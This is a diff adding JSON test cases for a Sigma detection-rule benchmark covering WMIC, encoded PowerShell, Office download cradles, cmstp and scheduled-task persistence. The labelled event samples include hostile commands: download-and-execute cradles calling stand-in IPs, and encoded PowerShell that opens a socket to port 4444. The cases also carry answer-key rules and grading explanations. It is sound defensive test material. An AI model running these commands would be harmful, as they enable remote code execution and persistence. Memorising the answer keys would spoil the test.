+      "cmd": "wmic.exe /node:WS-FIN-07 /user:svc-backup process call create cmd.exe /c C:\\Windows\\Temp\\run.bat",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-backup"
+     },
+     {
+      "cmd": "wmic /node:192.0.2.77 process   call   create cmd.exe /c whoami",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "wmic.exe process call create C:\\Users\\Public\\agent.exe",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe",
+      "user": "LAB\\bob"
+     }
+    ]
+   },
+   "evidence": [
+    "The operator ran wmic.exe /node:WS-FIN-07 /user:svc-backup process call create cmd.exe /c C:\\Windows\\Temp\\run.bat",
+    "The helpdesk toolkit hdtools.exe legitimately runs wmic.exe with the same call to start the remote support client",
+    "Detection should match wmic.exe with the process call create phrase."
+   ],
+   "expected_gate": "none",
+   "id": "CTL1-07",
+   "logsource": "windows_process_creation",
+   "report_text": "Lateral movement from the compromised file server relied on WMI process creation. The operator ran wmic.exe /node:WS-FIN-07 /user:svc-backup process call create cmd.exe /c C:\\Windows\\Temp\\run.bat, which starts the batch file on the remote host through the Win32_Process class. The words process call create form the stable part of the command line, while spacing and the other switches varied between operators. The helpdesk toolkit hdtools.exe legitimately runs wmic.exe with the same call to start the remote support client, so processes launched by hdtools.exe should be excluded. Detection should match wmic.exe with the process call create phrase.",
+   "role": "control",
+   "sigma_yaml": "title: Wmic Process Call Create Remote Execution\nid: c162d074-93a8-4fc1-a557-82d4a3f57007\nstatus: experimental\ndescription: 'Detects wmic.exe invoking the process call create method, excluding processes launched by the helpdesk toolkit.'\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1047\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: '\\wmic.exe'\n  selection_cli:\n    CommandLine|re: '.*process\\s+call\\s+create.*'\n  filter_helpdesk:\n    ParentImage|endswith: '\\hdtools.exe'\n  condition: selection_img and selection_cli and not filter_helpdesk\nfalsepositives:\n  - 'Administrators starting remote processes through wmic.exe by hand'\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1047"
+   ],
+   "why": "Correct rule: tag T1047 is valid, wmic.exe, the words process call create and hdtools.exe are all quoted in the evidence, the regex tolerates spacing variation, and the 'not' filter removes only the documented helpdesk toolkit, so wmic process listing and the toolkit look-alike do not match."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "NONE",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAdABvAHAAJwA=",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\CCM\\CcmExec.exe",
+      "parent_cmd": "C:\\Windows\\CCM\\CcmExec.exe",
+      "user": "NT AUTHORITY\\SYSTEM"
+     },
+     {
+      "cmd": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "powershell.exe -WindowStyle Hidden -File C:\\Scripts\\trayicon.ps1",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "powershell.exe -Command \"Get-Content C:\\Logs\\app.log -Encoding utf8\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "cmd.exe /c ipconfig /all",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "Teams.exe --processStart",
+      "image": "C:\\Users\\alice\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "schtasks /query /fo LIST",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMAAiACwANAA0ADQANAApAA==",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wscript.exe",
+      "parent_cmd": "wscript.exe //B C:\\Users\\alice\\AppData\\Local\\Temp\\inv.js",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "powershell -WindowStyle Hidden -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADEAMAAvAHMAJwApAA==",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "pwsh.exe -WindowStyle Hidden -NoProfile -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQA=",
+      "image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ]
+   },
+   "evidence": [
+    "The captured command line was powershell.exe -nop -w hidden -enc followed by about 300 characters of base64",
+    "later waves used the long forms -WindowStyle Hidden and -EncodedCommand on powershell.exe or pwsh.exe",
+    "ccmexec.exe starts powershell.exe with -EncodedCommand and -WindowStyle Hidden for compliance baselines"
+   ],
+   "expected_gate": "none",
+   "id": "CTL1-08",
+   "logsource": "windows_process_creation",
+   "report_text": "The loader executed its payload through hidden, encoded PowerShell. The captured command line was powershell.exe -nop -w hidden -enc followed by about 300 characters of base64, launched from a scheduled task, and later waves used the long forms -WindowStyle Hidden and -EncodedCommand on powershell.exe or pwsh.exe. A hidden window combined with an encoded command is the pairing attackers use to avoid a visible console and to conceal the script text. Configuration Manager is a known benign source: ccmexec.exe starts powershell.exe with -EncodedCommand and -WindowStyle Hidden for compliance baselines, so processes launched by ccmexec.exe should be excluded. Detection should require both an encoded command and a hidden window.",
+   "role": "control",
+   "sigma_yaml": "title: Hidden Window Encoded PowerShell Command\nid: d273e185-a4b9-40d2-b668-93e5b4068108\nstatus: experimental\ndescription: 'Detects powershell.exe or pwsh.exe started with both an encoded command and a hidden window style, excluding Configuration Manager.'\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1059.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith:\n      - '\\powershell.exe'\n      - '\\pwsh.exe'\n  selection_enc:\n    CommandLine|windash|contains: '-enc'\n  selection_hidden:\n    CommandLine|windash|contains:\n      - '-w hidden'\n      - '-WindowStyle Hidden'\n  filter_sccm:\n    ParentImage|endswith: '\\ccmexec.exe'\n  condition: selection_img and selection_enc and selection_hidden and not filter_sccm\nfalsepositives:\n  - 'Other management agents that start encoded hidden PowerShell and are not listed here'\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1059.001"
+   ],
+   "why": "Correct rule: tag T1059.001 is valid, all values including the ccmexec.exe exclusion are quoted in the evidence, an encoded command AND a hidden window are both required (short and long spellings via windash), and encoding-only, hidden-only and SCCM look-alikes do not match."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "NONE",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -Command \"Get-Service | Where-Object Status -eq Running\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "powershell.exe -c (New-Object Net.WebClient).DownloadFile('https://packages.lab.invalid/tool.zip','C:\\Temp\\tool.zip')",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n C:\\Users\\alice\\Documents\\notes.docx",
+      "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "OUTLOOK.EXE",
+      "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=Default",
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/s.ps1')",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\alice\\Downloads\\invoice.docm\"",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "powershell.exe -nop -w hidden -c (New-Object System.Net.WebClient).DownloadFile('http://files.cranemail.test/a.exe','C:\\Users\\Public\\a.exe')",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+      "parent_cmd": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" /e",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "powershell -ep bypass -c $w=New-Object Net.WebClient;$w.DownloadString('http://198.51.100.14/x')",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n",
+      "user": "LAB\\alice"
+     }
+    ]
+   },
+   "evidence": [
+    "Sysmon recorded winword.exe starting powershell.exe with a command line that used the Net.WebClient class and the DownloadString method",
+    "The same behaviour was observed from excel.exe in a second sample.",
+    "Detect winword.exe or excel.exe as parent of powershell.exe where the command line contains DownloadString, DownloadFile or Net.WebClient."
+   ],
+   "expected_gate": "none",
+   "id": "CTL1-09",
+   "logsource": "windows_process_creation",
+   "report_text": "A malicious Word attachment spawned PowerShell directly from the document process. Sysmon recorded winword.exe starting powershell.exe with a command line that used the Net.WebClient class and the DownloadString method to pull a script from the attacker server, then passed it to Invoke-Expression. The same behaviour was observed from excel.exe in a second sample. Office applications do not need to start PowerShell with download methods in normal operation. Detect winword.exe or excel.exe as parent of powershell.exe where the command line contains DownloadString, DownloadFile or Net.WebClient.",
+   "role": "control",
+   "sigma_yaml": "title: Office Application Spawning PowerShell Download Cradle\nid: e384f296-b5ca-41e3-8779-a4f6c5179209\nstatus: experimental\ndescription: 'Detects powershell.exe started by Word or Excel with a command line that uses a .NET download method.'\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1059.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_parent:\n    ParentImage|endswith:\n      - '\\winword.exe'\n      - '\\excel.exe'\n  selection_child:\n    Image|endswith: '\\powershell.exe'\n    CommandLine|contains:\n      - 'DownloadString'\n      - 'DownloadFile'\n      - 'Net.WebClient'\n  condition: selection_parent and selection_child\nfalsepositives:\n  - 'Office add-ins that call PowerShell to download templates, which are uncommon'\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1059.001"
+   ],
+   "why": "Correct rule: tag T1059.001 is valid, all values (winword.exe, excel.exe, powershell.exe, DownloadString, DownloadFile, Net.WebClient) are quoted in the evidence, and it requires an Office parent AND a download method in the PowerShell command line, so Office launches and non-Office or non-download PowerShell look-alikes do not match."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "NONE",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "powershell.exe -enc VwBoAG8AYQBtAGkA",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "powershell.exe -Command \"Get-Service | Where-Object Status -eq Running\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "whoami",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "msiexec.exe /i C:\\Temp\\app.msi /qn",
+      "image": "C:\\Windows\\System32\\msiexec.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\services.exe",
+      "parent_cmd": "services.exe",
+      "user": "NT AUTHORITY\\SYSTEM"
+     },
+     {
+      "cmd": "cmd.exe /c ipconfig /all",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -nop -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "powershell -noni -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA=",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "powershell.exe -w 1 -encodedcommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQA=",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wscript.exe",
+      "parent_cmd": "wscript.exe //B C:\\Users\\alice\\AppData\\Local\\Temp\\inv.js",
+      "user": "LAB\\alice"
+     }
+    ]
+   },
+   "evidence": [
+    "It was started with powershell.exe -nop -e followed by a single base64 argument of about 400 characters",
+    "Short forms of the -EncodedCommand switch such as -e, -en and -enc were all seen in the wild"
+   ],
+   "expected_gate": "none",
+   "id": "CTL1-10",
+   "logsource": "windows_process_creation",
+   "report_text": "Incident responders recovered the stager from a compromised workstation. It was started with powershell.exe -nop -e followed by a single base64 argument of about 400 characters with no spaces inside the blob. The encoding conceals the script content from simple command-line review. Short forms of the -EncodedCommand switch such as -e, -en and -enc were all seen in the wild, so a rule keyed on the full switch name misses them. Normal automation at this site passes scripts with -File or -Command and never needs an encoded argument that long. Detection should match powershell.exe when an -e style switch is followed by a base64 argument of at least 40 characters.",
+   "role": "control",
+   "sigma_yaml": "title: Powershell Encoded Command With Long Base64 Argument\nid: f4950307-c6db-42f4-988a-b507d628a30a\nstatus: experimental\ndescription: 'Detects powershell.exe started with an encoded command switch in a short or long form followed by a base64 argument of at least 40 characters.'\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1059.001\n  - attack.stealth\n  - attack.t1027\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: '\\powershell.exe'\n  selection_cli:\n    CommandLine|re: '.*\\s-e(n|nc|ncodedcommand)?\\s+\\S{40,}.*'\n  condition: selection_img and selection_cli\nfalsepositives:\n  - 'Management agents that pass long encoded scripts, to be reviewed individually'\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1059.001",
+    "T1027"
+   ],
+   "why": "Correct rule: tags match T1059.001 and T1027, powershell.exe and the encoded-command literal are quoted in the evidence, and the regex needs an -e, -en, -enc or -encodedcommand switch followed by a 40+ character argument, so a short encoded one-liner, -ExecutionPolicy, -eq and -File invocations do not match."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "NONE",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "cmstp.exe /u C:\\Windows\\System32\\vpnprofile.inf",
+      "image": "C:\\Windows\\System32\\cmstp.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "cmstp.exe /s C:\\Program Files\\Vendor\\vpn.inf",
+      "image": "C:\\Windows\\System32\\cmstp.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\msiexec.exe",
+      "parent_cmd": "msiexec.exe /i C:\\Temp\\app.msi /qn",
+      "user": "NT AUTHORITY\\SYSTEM"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "tasklist /v",
+      "image": "C:\\Windows\\System32\\tasklist.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "OneDrive.exe /background",
+      "image": "C:\\Users\\alice\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "schtasks /query /fo LIST",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "cmstp.exe /s /ns C:\\Users\\Public\\corp.inf",
+      "image": "C:\\Windows\\System32\\cmstp.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "cmstp.exe /au /s /ns C:\\Windows\\Temp\\setup.inf",
+      "image": "C:\\Windows\\System32\\cmstp.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "cmstp.exe /ns /s \\\\files.cranemail.test\\share\\p.inf",
+      "image": "C:\\Windows\\SysWOW64\\cmstp.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "parent_cmd": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -secured -Embedding",
+      "user": "NT AUTHORITY\\SYSTEM"
+     }
+    ]
+   },
+   "evidence": [
+    "Process telemetry showed cmstp.exe /s /ns C:\\Users\\Public\\corp.inf, where the INF file declared a UnRegisterOCXs section that loaded a remote scriptlet",
+    "Detection should match cmstp.exe with the /s and /ns switches and an .inf file argument."
+   ],
+   "expected_gate": "none",
+   "id": "CTL1-11",
+   "logsource": "windows_process_creation",
+   "report_text": "The intruder used the Connection Manager profile installer to execute a payload while bypassing application control. Process telemetry showed cmstp.exe /s /ns C:\\Users\\Public\\corp.inf, where the INF file declared a UnRegisterOCXs section that loaded a remote scriptlet. The /s switch installs the profile silently and /ns suppresses the desktop shortcut, so no dialog is displayed to the user. The cmstp.exe binary is rarely used on normal corporate laptops because VPN profiles are deployed another way. Detection should match cmstp.exe with the /s and /ns switches and an .inf file argument.",
+   "role": "control",
+   "sigma_yaml": "title: Cmstp Silent Install of INF Profile\nid: 05a61418-d7ec-4305-a99b-c618e739b40b\nstatus: experimental\ndescription: 'Detects cmstp.exe run with the silent and no-shortcut switches and an INF file argument, a known proxy for code execution.'\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.003\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: '\\cmstp.exe'\n  selection_cli:\n    CommandLine|contains|all:\n      - '/s'\n      - '/ns'\n      - '.inf'\n  condition: selection_img and selection_cli\nfalsepositives:\n  - 'Scripted deployment of connection profiles using both silent switches'\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.003"
+   ],
+   "why": "Correct rule: tag T1218.003 is valid, cmstp.exe and the /s, /ns and .inf values are quoted in the evidence, and it needs all three switches together, so a silent corporate VPN profile install (/s without /ns) and a profile uninstall do not match."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "NONE",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "schtasks /query /fo LIST",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "schtasks.exe /create /tn Backup /tr \"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1\" /sc daily /st 02:00",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "cmd.exe /c ipconfig /all",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "whoami",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "tasklist /v",
+      "image": "C:\\Windows\\System32\\tasklist.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "schtasks.exe /create /tn Updater /tr \"powershell.exe -w hidden -File C:\\ProgramData\\Updater\\sync.ps1\" /sc onlogon /ru SYSTEM",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "schtasks /create /f /tn OneDriveSync /tr \"powershell -WindowStyle Hidden -NoProfile -File C:\\Users\\Public\\od.ps1\" /sc minute /mo 30",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wscript.exe",
+      "parent_cmd": "wscript.exe //B C:\\Users\\alice\\AppData\\Local\\Temp\\inv.js",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "schtasks.exe /create /tn WinUpdateCheck /sc daily /st 03:00 /tr \"cmd.exe /c powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.91/u')\"",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ]
+   },
+   "evidence": [
+    "The command observed on the file server was schtasks.exe /create /tn Updater /tr \"powershell.exe -w hidden -File C:\\ProgramData\\Updater\\sync.ps1\" /sc onlogon /ru SYSTEM",
+    "Detection should match schtasks.exe with the /create switch, powershell in the task action and a hidden window style, written either -w hidden or -WindowStyle Hidden."
+   ],
+   "expected_gate": "none",
+   "id": "CTL1-12",
+   "logsource": "windows_process_creation",
+   "report_text": "The operator established persistence with a scheduled task that launches a hidden PowerShell script at every logon. The command observed on the file server was schtasks.exe /create /tn Updater /tr \"powershell.exe -w hidden -File C:\\ProgramData\\Updater\\sync.ps1\" /sc onlogon /ru SYSTEM. Administrators at this site also create tasks that call PowerShell, for example with -NoProfile -ExecutionPolicy Bypass -File, but they never hide the window, so the hidden window style is what separates the two. Detection should match schtasks.exe with the /create switch, powershell in the task action and a hidden window style, written either -w hidden or -WindowStyle Hidden.",
+   "role": "control",
+   "sigma_yaml": "title: Scheduled Task Creation Launching Hidden PowerShell\nid: 16b72529-e8fd-4416-ba0c-d729f84ac50c\nstatus: experimental\ndescription: 'Detects schtasks.exe creating a task whose action runs PowerShell with a hidden window style.'\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.privilege_escalation\n  - attack.t1053.005\n  - attack.t1059.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: '\\schtasks.exe'\n  selection_create:\n    CommandLine|contains|all:\n      - '/create'\n      - 'powershell'\n  selection_hidden:\n    CommandLine|windash|contains:\n      - '-w hidden'\n      - '-WindowStyle Hidden'\n  condition: all of selection*\nfalsepositives:\n  - 'Administrators who deliberately hide the console window of a maintenance task'\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1053.005",
+    "T1059.001"
+   ],
+   "why": "Correct rule: tags match T1053.005 and T1059.001, all values (schtasks.exe, /create, powershell, -w hidden, -WindowStyle Hidden) are quoted in the evidence, and it requires task creation AND PowerShell AND a hidden window, so queries, non-hidden PowerShell tasks and other task creations do not match."
+  }
+ ]
+}
